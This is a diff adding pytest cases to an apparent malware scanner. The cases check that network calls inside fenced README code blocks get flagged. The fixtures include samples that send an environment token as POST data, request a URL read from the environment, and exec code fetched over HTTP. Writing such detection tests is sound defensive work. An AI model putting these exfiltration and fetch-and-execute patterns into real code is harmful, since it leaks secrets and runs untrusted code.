@@ -370,6 +370,46 @@ urlopen("http://localhost:8080/v1/models")
 
 
 @pytest.mark.parametrize(
+    "request_options",
+    [
+        'data=os.environ["EXFIL_TOKEN"].encode()',
+        'method="POST"',
+    ],
+)
+def test_text_scanner_fenced_documentation_request_active_options_remain_actionable(
+    tmp_path: Path,
+    request_options: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        f"""```python
+import os
+import urllib.request
+
+req = urllib.request.Request(
+    "http://images.cocodataset.org/val2017/000000039769.jpg",
+    {request_options},
+)
+urllib.request.urlopen(req)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "http://images.cocodataset.org/val2017/000000039769.jpg"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
     "api_url",
     [
         "http://user:pass@localhost:8080/v1/embeddings",
@@ -1529,6 +1569,36 @@ url = "http://images.cocodataset.org/val2017/000000039769.jpg"
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_annotated_reassignment(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import os
+import requests
+
+url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+url: str = os.environ["EXFIL_URL"]
+requests.get(url)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_imported_post(
     tmp_path: Path,
 ) -> None:
@@ -1553,6 +1623,33 @@ post(os.environ["EXFIL_URL"])
         and check.details.get("type") == "url_detected"
         and check.details.get("url") == "http://localhost:8080/v1/embeddings"
         and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_imported_executed_get(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+from requests import get
+
+exec(get("http://localhost:8080/v1/models").text)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "http://localhost:8080/v1/models"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
